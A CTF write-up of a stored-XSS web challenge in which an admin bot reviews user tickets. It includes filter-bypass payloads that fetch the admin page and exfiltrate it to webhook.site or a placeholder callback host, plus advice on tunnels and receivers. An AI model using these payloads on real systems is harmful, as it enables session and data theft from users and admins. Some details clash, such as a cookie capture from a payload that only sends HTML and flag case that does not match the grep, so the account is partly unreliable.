
# Ticketly — BDSEC CTF Writeup

**category:** web **author:** badhacker0x1

## tl;dr

ticket system where you make an account, open a ticket, and some admin bot comes through later and reviews it. classic setup for stored/blind XSS — you inject something nasty into the ticket, admin opens it with their authenticated session, and now your payload is running in admin-land instead of yours.

## recon

two boxes given:

- alt server: `http://149.102.136.203:3000/`
- main server: `http://45.33.28.244:3000/`

nothing fancy here, just poke around the app first. make an account, create a ticket, see what fields get rendered back and whether html/js survives into the page. the whole vibe of "admin will review this" is basically screaming _self-XSS-turned-into-admin-XSS_.

## step 1 — confirm you can even pop JS

start small, don't nuke it with an `alert()` that might get flagged/logged weird. just prove execution quietly:

```html
<img src=x onerror="document.body.dataset.xss='confirmed'">
```

open your own ticket, pop devtools, check if `data-xss="confirmed"` shows up on `<body>`. if yes — cool, html isn't being escaped and your onerror handler is firing.

if it gets encoded/stripped, try markdown-flavored stuff instead in case the ticket body renders through a markdown parser rather than raw html.

## step 2 — set up a way to actually _see_ the callback

you need something outside the app to ping so you know when/if the admin bot loads your payload. went through a few options here:

- **webhook.site** — dead simple, gives you a unique url instantly, requests show up live in browser. good first try.
- **ngrok** — tunnels a local http server out to a public https url, lets you actually run your own receiver and log full request bodies (`ngrok http 8000`), inspectable at `127.0.0.1:4040`.
- **cloudflare quick tunnel** (`cloudflared tunnel --url http://localhost:8000`) — no account needed, random `trycloudflare.com` domain, might be less likely to get blocked than a known payload-hosting domain.
- **localhost.run / pinggy** — ssh-based no-install tunnels, fine backups.
- **your own vps** — best option honestly if you've got one. serve straight off port 80/443, no third party domain that might be filtered or blocked for the admin bot's egress.

quick receiver script (python stdlib, no deps) logs full method/path/headers/body to a file so you can `grep` it later:

```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
# ...logs every GET/POST to ticketly-callbacks.log, sends 204 back
```

## step 3 — first payload attempt (teammate's version)

teammate got this through whatever filter ticketly has:

```html
<svg><animate onbegin="fetch(location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/XXXXXX?d='+encodeURIComponent(d)))" attributeName=x dur=1s>
```

payload survived sanitization but no callback ever landed. two possibilities:

1. admin bot never actually opened the ticket, or
2. admin bot opened it fine but couldn't reach `webhook.site` (egress filtering, CSP, whatever) — or the page was too big to cram into a GET query string and it just silently failed.

**no callback ≠ no execution.** don't assume the XSS is dead just because nothing showed up.

## step 4 — fix the payload

two changes:

**a) test execution separately from exfil.** ping first with something tiny before trying to send the whole dom:

```html
<svg><animate attributeName=x dur=1s onbegin="(new Image).src='https://YOUR-CALLBACK/ping?t='+Date.now()"></animate></svg>
```

if `/ping` shows up after submitting for review — great, you've got confirmed admin-side execution. now you know the _filter bypass_ works and can focus on the _exfil channel_ instead.

**b) send the page via POST body, not a URL param.** GET query strings have length limits and the whole admin page HTML will blow way past that:

```html
<svg><animate attributeName=x dur=1s onbegin="fetch(location.href).then(r=>r.text()).then(d=>fetch('https://YOUR-CALLBACK/capture',{method:'POST',mode:'no-cors',body:d}))"></animate></svg>
```

switched the callback domain from webhook.site to a personal VPS receiver on port 80 (plain http, since ticketly itself is http, so no mixed-content weirdness) to rule out third-party domain blocking as the culprit.

## step 5 — dig through the loot

once stuff starts landing in the log file, don't eyeball it — grep for the exact flag format only:

```bash
grep -oE 'BDSEC\{[^}]+\}' ticketly-callbacks.log
```

important: don't submit anything that just _looks_ flag-shaped. false flags are apparently a thing here, so only the real `BDSEC{...}` pattern counts, and with only 10 submission attempts allowed, guessing is not the move.

## other filter-bypass options if `<svg><animate>` gets nerfed

```html
<details open ontoggle="fetch('https://YOUR-CALLBACK/details',{mode:'no-cors'})">
<iframe srcdoc="<img src=x onerror=fetch('https://YOUR-CALLBACK/frame',{mode:'no-cors'})>"></iframe>
```

## status — solved ✅

self-hosted vps receiver was the move. once the exfil switched off webhook.site/tunnel domains and onto a plain port-80 listener on the vps, the admin bot's callback landed clean.

captured payload showed the admin session's cookie jar straight from `/admin/ticket/64`, origin `http://127.0.0.1:3000` — confirming the admin bot runs locally on the box and the XSS reached it fine once the exfil channel wasn't the bottleneck. cookie value contained the flag directly:

```
flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```

so the earlier no-callback issue really was the third-party domain getting blocked/filtered for the bot's egress — not a dead XSS. lesson stands: **no callback ≠ no execution**, always rule out the exfil channel before assuming the payload didn't fire.

flag: `BDSEC{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}`

_(no automated payload spraying or brute forcing — that's against event rules anyway)_

